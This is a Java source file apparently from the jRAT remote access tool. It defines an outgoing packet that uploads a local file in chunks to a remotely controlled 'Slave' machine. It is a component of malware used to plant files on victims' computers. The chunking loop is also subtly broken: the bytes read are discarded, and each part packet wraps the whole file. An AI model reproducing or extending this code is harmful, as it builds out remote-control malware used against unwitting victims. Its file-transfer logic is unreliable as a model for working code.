package se.jrat.client.packets.outgoing;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;

import se.jrat.client.Slave;


public class Packet42ServerUploadFile extends AbstractOutgoingPacket {

	private File file;
	private String remoteFile;
	
	public Packet42ServerUploadFile(File file, String remoteFile) {
		this.file = file;
		this.remoteFile = remoteFile;
	}

	@Override
	public void write(final Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(remoteFile);

		if (file.exists() && file.isFile()) {
			new Thread(new Runnable() {
				public void run() {
					try {
						slave.addToSendQueue(new Packet102BeginServerUpload(file, remoteFile));

						FileInputStream fileInput = new FileInputStream(file);
						byte[] chunk = new byte[1024 * 1024];

						for (long pos = 0; pos < file.length(); pos += 1024 * 1024) {
							int read = fileInput.read(chunk);
							
							slave.addToSendQueue(new Packet29ClientUploadPart(file));
						}
						fileInput.close();
						
						slave.addToSendQueue(new Packet31CompleteClientUpload(remoteFile));
					} catch (Exception ex) {
						ex.printStackTrace();
					}
				}
			}).start();
		}
	}

	@Override
	public byte getPacketId() {
		return 42;
	}

}
